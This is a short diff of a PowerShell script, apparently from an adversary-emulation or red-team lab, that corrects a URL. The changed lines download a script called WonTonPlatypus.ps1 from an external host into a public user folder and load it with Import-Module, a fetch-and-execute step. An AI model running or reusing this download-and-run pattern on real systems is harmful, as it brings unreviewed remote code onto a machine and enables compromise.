@@ -50,7 +50,7 @@ Remove-Item $tempFilePath
 
 
 
-$url = "https://attck.community/attck/ad/WonTonPlatypus.ps1.ps1"
+$url = "https://attck.community/attck/ad/WonTonPlatypus.ps1"
 $tempFilePath = "C:\Users\Public\powen.ps1"
 Invoke-WebRequest $url -OutFile $tempFilePath 
 Import-Module $tempFilePath 
